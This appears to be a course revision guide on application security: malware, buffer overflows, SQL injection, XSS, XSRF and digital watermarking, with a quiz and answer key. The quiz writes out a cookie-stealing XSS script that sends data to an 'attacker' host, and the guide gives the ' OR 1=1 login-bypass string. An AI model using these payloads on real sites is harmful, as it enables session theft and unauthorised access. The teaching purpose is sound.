**1. Overview**
This chapter covers the critical vulnerabilities and protective measures at the application layer. It matters because it explores how malicious software (malware) and input validation failures (such as buffer overflows and SQL injection) can completely compromise system security. Furthermore, it details how stateless web protocols are exploited via cross-site scripting (XSS) and cross-site request forging (XSRF), and concludes with how digital watermarking is utilised to protect copyright and verify the integrity of digital media. Understanding these concepts is essential for defending against the most prevalent application-level attacks.

**2. Key Terms**
*   **Malicious Software (Malware):** Program code executed without a user’s consent and carrying out harmful functionality [051 Slide 3/32].
*   **Virus:** Malware that copies itself to other files; needs a host file to propagate and execute [051 Slide 14/32].
*   **Worm:** Malware that exploits vulnerabilities present and can spread over the network independently [051 Slide 14/32].
*   **Trojan:** A deceptive program that spoofs a harmless or useful program but actually stores other malware [051 Slide 14/32].
*   **Rootkit:** A set of programs that alter OS functionality to mask malicious processes and ensure privileged remote access [051 Slides 12/32, 14/32].
*   **Buffer Overflow:** A vulnerability where, without proper bound checking, buffer content overspills into the adjacent upper stack area, allowing an attacker to overwrite the return address and hijack the execution flow [051 Slide 21/32].
*   **Code Injection:** Tricking a program into executing an attacker's code by clever input construction that mixes code and data [051 Slide 26/32].
*   **Cross-Site Scripting (XSS):** A vulnerability found in any web application that returns user input without filtering, allowing the execution of arbitrary Javascript in a user's browser [052 Slide 13/24].
*   **Cross-Site Request Forging (XSRF):** An attack where a browser sends a forged user request including the existing authorisation credentials (like session cookies) to a server [052 Slide 16/24].
*   **Digital Watermark:** A digital signal or pattern inserted into a digital document that carries information unique to the copyright owner, creator, or authorised consumer [053 Slide 4/27].
*   **Spatial Watermarking:** Applying a watermark by changing some of the pixel values in the lower bit plane (LSB) [053 Slide 18/27].
*   **Frequency Domain Watermarking:** Converting an image to the frequency domain and applying the watermark in low frequency, redundant data areas [053 Slide 18/27].

**3. Processes & Models**

**Malware Incident Handling Steps**
1. Preparation (Steady State)
2. Identification (Declare an Incident)
3. Containment 
4. Eradication (Start Clean-Up)
5. Recovery (Finish Clean-Up, Back in Production)
6. Lessons Learned

**Stack Buffer Overflow Hijacking Sequence**
1. A local buffer is allocated “bottom-up” (from lower to higher stack locations).
2. Without proper bound checking, buffer content overspills into the adjacent upper stack area.
3. An attacker overwrites the return address with an arbitrary value.
4. The execution flow is hijacked.

**XSS Attack Sequence**
1. The attacker uses a website's form to insert a malicious string into the database.
2. The victim requests a page from the website.
3. The website includes the malicious string from the database in the response and sends it to the victim.
4. The victim's browser executes the malicious script inside the response, sending the victim's cookies to the attacker's server.

**Algorithm & Transformation Checksum Watermarking**
1. Locations of the pixels that are to contain one bit each of the checksum are randomly chosen.
2. A watermark is formed from the 7 most significant bits of each pixel.
3. Eight 7-bit segments are concatenated, and the final checksum (via hash function) is 56-bit.
4. The last bit of each pixel is then changed to the corresponding checksum bit.

**4. Most Examinable Points**
*   **You must know** that the primary source of software insecurity is the failure to validate user input (Input Cleansing and Validation).
*   **You must know** the difference between a Virus (needs a host file to propagate) and a Worm (exploits vulnerabilities to spread independently).
*   **You must know** that a stack frame comprises four elements: function arguments, return address, frame pointer, and local variables.
*   **You must know** the three defensive mechanisms against stack exploits: Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries (checking a special value before following the return).
*   **You must know** the difference between HTTP GET (parameters in URI, safe/no side-effects) and HTTP POST (parameters in body, potential side-effects).
*   **You must know** that SQL Injection bypasses password checks using strings like `' OR 1=1` because it makes the SQL `WHERE` clause always evaluate to true.
*   **You must know** the three SQL injection defence mechanisms: Validate/Sanitise Input, Parameterised Input, and SQL Escape.
*   **You must know** the difference between Encryption (transforms document to be unreadable without a key) and Watermarking (leaves the original file intact and recognisable).
*   **You must know** the five applications of digital watermarking: Ownership Assertion, Fingerprinting/Content Protection, Authentication & integrity verification, Content labeling, and Usage control & Copy protection.
*   **You must know** the five characteristics of a good watermark: Unobtrusive, Readily Detectable, Unambiguous, Innumerable, and Robust.
*   **You must know** the three text watermarking techniques: Text Line Coding (spacing between lines), Word-shift Coding (spacing between words), and Character/Typeface Encoding (altering shapes of characters).
*   **You must know** that a Jitter attack tweaks lower-order bits and adds jitter by splitting the signal into chunks and duplicating or deleting them at random to destroy the watermark.
*   **You must know** that a StirMark attack applies minor geometric distortions like stretching, shearing, shifting, and rotation to distort the watermark.

**5. Common Mistakes**
*   **Confusing Viruses and Worms:** Students frequently mix these up. Remember: a virus *requires a host file* and user interaction to spread. A worm exploits vulnerabilities to spread *independently* across a network.
*   **Misunderstanding XSS vs. Cross-Site Request Forging:** XSS involves injecting malicious *scripts* that execute inside the victim's browser. Request Forging involves forging a *request* from a victim's browser to exploit their existing authenticated session (e.g., an active banking login).
*   **Assuming Encryption and Watermarking are the same:** Encryption transforms a document to make it unreadable without a decryption key. Watermarking leaves the original file intact and readable, merely hiding a copyright or integrity marker within it.
*   **Thinking LSB Checksum Watermarking is robust:** Students sometimes assume LSB checksums are highly secure. In reality, it is extremely fragile; the verification fails with any change, it cannot survive lossy compression, and a forger can remove the entire watermark by dropping the LSB plane.

**6. Quiz**
1. Define "Malware" according to the slides.
2. What is the fundamental difference between a Virus and a Worm?
3. Name the four components that make up a stack frame.
4. Name the three security mechanisms that protect the stack against buffer overflow attacks.
5. In web security, what does an XSRF (Cross-Site Request Forging) attack exploit?
6. What is the difference between GET and POST HTTP methods?
7. Name the three defence mechanisms against SQL Injection.
8. What is the main difference between encryption and digital watermarking?
9. Name the five characteristics (requirements) of a good digital watermark.
10. What are the three techniques used for Text Watermarking?
11. What is the difference between Spatial and Frequency Domain watermarking?
12. How does a SQL injection attack bypass a password check using the string `' OR 1=1`?
13. Name three applications of digital watermarking.
14. What specific stack frame component does a buffer overflow attacker target to hijack the execution flow?
15. What are the six steps of Malware Incident Handling?
16. What does a StirMark attack simulate by applying geometric distortions (stretching, shearing, shifting, rotation)?
17. What specifically does a "Canary" do to protect the stack?
18. What is the mechanism of a "Jitter attack" in the context of digital watermarking?
19. *Applied Question:* Your company's web application returns user input without filtering. An attacker submits a form containing `<script>window.location='http://attacker/?cookie='+document.cookie</script>`. When an innocent user views the page, their browser executes this. What specific type of attack is this?
20. *Applied Question:* An attacker inputs a string longer than 128 bytes into a vulnerable C function `strcpy(buf, str)`. The buffer overspills into the adjacent upper stack area. What type of vulnerability is this, and what is the primary defensive mechanism that randomises the stack memory allocation to prevent it?

***

**Answers**
1. Program code executed without a user's consent and carrying out harmful functionality.
2. A Virus requires a host file to propagate and execute, whereas a Worm exploits vulnerabilities to spread independently over a network.
3. Function arguments, Return address, Frame pointer, and Local variables.
4. Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries.
5. It exploits an existing authenticated session (like an active session cookie) by tricking the browser into sending a forged request.
6. GET retrieves a resource (parameters in URI, safe/no side-effects), whereas POST sends data to a server (parameters in body, potential side-effects).
7. Validate/Sanitise Input, Parameterised Input, and SQL Escape.
8. Encryption transforms a document to make it unreadable without a key, whereas watermarking leaves the original document intact and recognisable.
9. Unobtrusive, Readily Detectable, Unambiguous, Innumerable, and Robust.
10. Text Line Coding, Word-shift Coding, and Character/Typeface Encoding.
11. Spatial watermarking changes pixel values in the lower bit plane (LSB), whereas Frequency Domain watermarking converts the image and applies the watermark in low frequency redundant data areas.
12. It modifies the SQL query so that the password check evaluates to true (since `1=1` is always true), permitting access even if the password field is empty.
13. Any three of: Ownership Assertion, Fingerprinting/Content Protection, Authentication & integrity verification, Content labeling, Usage control & Copy protection.
14. The return address.
15. Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.
16. It simulates the printing/scanning process.
17. It precedes the return value with a special value, checking if the content has changed after the call to prevent execution if altered.
18. It splits the signal into chunks and tweaks the lower-order bits by duplicating or deleting chunks at random.
19. Cross-Site Scripting (XSS).
20. This is a Buffer Overflow. The defensive mechanism is Address Space Layout Randomisation (ASLR).
```
